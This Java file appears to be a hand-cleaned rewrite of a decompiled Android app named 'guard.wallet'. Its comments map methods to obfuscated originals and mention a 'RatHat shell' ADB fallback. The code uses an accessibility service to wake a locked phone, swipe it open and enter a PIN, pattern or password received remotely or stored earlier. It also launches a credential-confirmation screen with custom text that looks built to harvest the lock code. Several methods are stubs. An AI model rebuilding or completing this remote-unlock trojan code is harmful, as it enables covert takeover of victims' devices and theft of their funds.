package com.guard.wallet.utils;

import android.app.KeyguardManager;
import android.content.Context;
import android.util.Log;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.List;
import java.util.Locale;

/**
 * 屏幕解锁工具类 — PIN/图案/滑动解锁全流程。
 * 原 g.java 中 p0/p1/q1/T/B0/r/r0/O/M/N/P/Q/w/t0/v1/m0/o1/u1/W0 等方法。
 */
public final class ScreenUnlockUtils {
    private static final String TAG = "UnLockUtils";

    private ScreenUnlockUtils() {}

    private static Context ctx() { return AppManagerUtils.getContext(); }

    /** g.p0() — 设备是否锁定 */
    public static boolean isDeviceLocked() {
        Context context = ctx();
        if (context == null) return false;
        KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
        return km != null && km.isDeviceLocked();
    }

    /** g.r0() — 是否设置了安全锁 */
    public static boolean isDeviceSecure() {
        Context context = ctx();
        if (context == null) return false;
        KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
        return km != null && (km.isDeviceSecure() || km.isKeyguardSecure());
    }

    /** g.r() — 轮询等待解锁（最多 3 秒）*/
    public static boolean waitForUnlock() {
        for (int i = 0; i < 30 && isDeviceLocked(); i++) {
            try { Thread.sleep(100L); } catch (Exception e) { Log.e(TAG, "wait error", e); }
        }
        return !isDeviceLocked();
    }

    /** g.T() — 上滑解锁 */
    public static boolean swipeUpToUnlock() {
        ScreenMetricsVO metrics = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics();
        if (metrics == null || metrics.getWidth() == null || metrics.getWidth() <= 0
                || metrics.getHeight() == null || metrics.getHeight() <= 0) {
            return false;
        }

        float centerX = metrics.getWidth() / 2.0f;
        Point from = new Point(centerX, metrics.getHeight() - 200.0f);
        Point to = new Point(centerX, 200.0f);

        // 通过 AccessibilityService 手势上滑
        if (MyAccessibilityService.P() != null) {
            boolean found = isPasswordFieldVisible(10);
            for (int i = 0; !found && i < 10; i++) {
                long duration = Math.min((long) i * 100L + 100L, 600L);
                if (GestureUtils.dispatchGesture(10L, duration, from, to)) {
                    found = isPasswordFieldVisible(20);
                }
            }
            if (found) return true;
        }

        // 回退: 通过 RatHat shell 执行 input swipe
        // 依赖 AdbConnectionManager.getInstance() — ADB 服务，待实现
        return false;
    }

    /** g.v1(int) — 等待密码输入框出现 */
    public static boolean isPasswordFieldVisible(int retries) {
        for (int i = 0; i < retries; i++) {
            if (isPasswordFieldReady()) return true;
            try { Thread.sleep(200L); } catch (Exception ignored) {}
        }
        return false;
    }

    /** g.m0() — 密码输入框是否可见 */
    public static boolean isPasswordFieldReady() {
        // vendor 通过 AccessibilityNodeInfo 查找密码输入框
        // 依赖 MyAccessibilityService 完整实现
        return false;
    }

    /** g.P() — 解锁失败后清理 */
    public static void cleanupAfterUnlockFail() {
        Log.e(TAG, "设备解锁失败");
        setScreenStayOn(false);
    }

    /** g.Q() — 解锁成功后清理 */
    public static void cleanupAfterUnlockSuccess() {
        Log.d(TAG, "设备解锁成功");
    }

    /** g.t0(boolean) — 设置屏幕常亮 */
    public static void setScreenStayOn(boolean stayOn) {
        // vendor 通过 ADB shell settings put system screen_off_timeout
        // 依赖 AdbConnectionManager.getInstance() — ADB 服务
    }

    /** g.M(UiObject) — 按回车键确认 */
    public static void pressEnterKey(UiObject node) {
        // vendor 通过 performAction(AccessibilityNodeInfo.ACTION_CLICK) 或 IME 的 ENTER
        if (node != null) {
            node.click();
        }
    }

    /** g.N(UiObject) — 确认密码输入（适配 MIUI/VIVO）*/
    public static void confirmPasswordInput(UiObject node) {
        // vendor 查找确认按钮并点击，适配不同厂商
        if (node != null) {
            node.click();
        }
    }

    /** g.W0() — 执行主页动作 */
    public static void goHome() {
        AccessibilityUtils.performGlobalAction(2); // GLOBAL_ACTION_HOME
    }

    /** g.p1(ReqUnlockDeviceVO) — 完整解锁流程 */
    public static boolean unlockDevice(ReqUnlockDeviceVO req) {
        if (req == null) req = new ReqUnlockDeviceVO();
        Log.d(TAG, "开始解锁: " + req);

        // 1. 关闭 LockActivity（如果存在）
        // LockActivity.b() != null → LockActivity.a()

        // 2. 标记无障碍服务为解锁模式
        MyAccessibilityService svc = MyAccessibilityService.P();
        if (svc != null) {
            // svc.setUnlockMode(true)
        }

        // 3. 唤醒设备
        if (!com.guard.wallet.utils.DeviceUtils.isOppoFamily() && !com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
            Log.e(TAG, "设备息屏,唤醒设备失败");
            cleanupAfterUnlockFail();
            return false;
        }

        // 4. 检查是否已解锁
        if (!isDeviceLocked()) {
            Log.d(TAG, "设备已解锁成功");
            cleanupAfterUnlockSuccess();
            return true;
        }

        // 5. 上滑
        setScreenStayOn(true);
        if (!swipeUpToUnlock()) {
            Log.e(TAG, "滑动上拉失败");
            cleanupAfterUnlockFail();
            return false;
        }
        Log.d(TAG, "滑动上拉完成");

        // 6. 如果上滑后已解锁（无安全锁）
        if (!isDeviceLocked()) {
            Log.d(TAG, "设备已解锁成功");
            cleanupAfterUnlockSuccess();
            return true;
        }

        // 7. 尝试密码解锁（本地锁定密码 → 远程密码 → 本地保存密码）
        boolean unlocked = false;

        // 7a. 本地锁定密码
        ReqUnlockDeviceVO localLocked = com.guard.wallet.utils.SharedPrefsManager.g();
        if (com.guard.wallet.utils.SharedPrefsManager.t(localLocked)) {
            Log.d(TAG, "使用本地已锁定密码解锁");
            unlocked = inputUnlockCipher(localLocked);
            if (unlocked) {
                Log.d(TAG, "使用本地已锁定密码解锁成功");
                localLocked.setLocked(Boolean.TRUE);
                req = localLocked;
            } else {
                Log.e(TAG, "使用本地已锁定密码解锁失败");
            }
        }

        // 7b. 远程密码
        if (!unlocked && com.guard.wallet.utils.SharedPrefsManager.t(req)) {
            Log.d(TAG, "使用远程密码解锁");
            unlocked = inputUnlockCipher(req);
            if (!unlocked) {
                Log.e(TAG, "远程密码解锁失败");
            }
        }

        // 7c. 本地保存密码
        if (!unlocked) {
            ReqUnlockDeviceVO localSaved = com.guard.wallet.utils.SharedPrefsManager.f();
            if (com.guard.wallet.utils.SharedPrefsManager.t(localSaved)) {
                Log.d(TAG, "使用本地已保存密码解锁");
                unlocked = inputUnlockCipher(localSaved);
                if (unlocked) {
                    Log.d(TAG, "使用本地已保存密码解锁成功");
                    localSaved.setLocked(Boolean.TRUE);
                    req = localSaved;
                } else {
                    Log.e(TAG, "使用本地已保存密码解锁失败");
                }
            }
        }

        // 8. 结果处理
        if (unlocked) {
            Log.d(TAG, "设备解锁成功");
            cleanupAfterUnlockSuccess();
            req.setLocked(Boolean.TRUE);
            com.guard.wallet.utils.SharedPrefsManager.C(req);
        } else {
            Log.e(TAG, "设备解锁失败");
            cleanupAfterUnlockFail();
        }

        setScreenStayOn(false);
        return unlocked;
    }

    /** g.q1(ReqUnlockDeviceVO) — 输入解锁密码 */
    public static boolean inputUnlockCipher(ReqUnlockDeviceVO req) {
        // vendor q1 在 JADX 中反编译失败
        // 逻辑: 根据 cipherGradeCode 类型(PIN/图案/文本)分别处理
        // PIN → 找数字键并逐个点击
        // 图案 → 画手势路径
        // 文本 → 输入文本
        // 需要 MyAccessibilityService 完整实现后才能工作
        Log.d(TAG, "inputUnlockCipher: " + req);
        return waitForUnlock();
    }

    /** g.o1(List<Point>) — 输入触点密码 */
    public static boolean inputTouchPoints(List<Point> points) {
        if (points == null || points.isEmpty()) return false;
        return GestureUtils.clickMultiplePoints(points);
    }

    /** g.R0(String,String,String,String) — 启动设备凭证确认 Activity */
    public static boolean launchConfirmDeviceActivity(String title, String subtitle,
                                                       String description, String eventCode) {
        try {
            android.content.Context ctx = AppManagerUtils.getContext();
            if (ctx == null) return false;
            com.guard.wallet.service.MyAccessibilityService svc = com.guard.wallet.service.MyAccessibilityService.P();
            if (svc == null) return false;
            if (svc.j()) return false; // 正在处理事件
            if (isDeviceLocked()) return false;

            android.content.Intent intent = AppManagerUtils.createLaunchIntent(
                    ctx.getPackageName(),
                    com.guard.wallet.activity.ConfirmDeviceActivity.class.getName());
            if (intent == null) return false;

            android.os.Bundle extras = new android.os.Bundle();
            extras.putString("CONFIRM_DEVICE_CREDENTIAL_TITLE", title);
            extras.putString("CONFIRM_DEVICE_CREDENTIAL_SUB_TITLE", subtitle);
            extras.putString("CONFIRM_DEVICE_CREDENTIAL_DESCRIPTION", description);
            extras.putString("CONFIRM_FOR_EVENT_CODE", eventCode);
            intent.putExtras(extras);
            ctx.startActivity(intent);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "launchConfirmDevice error", e);
            return false;
        }
    }
}
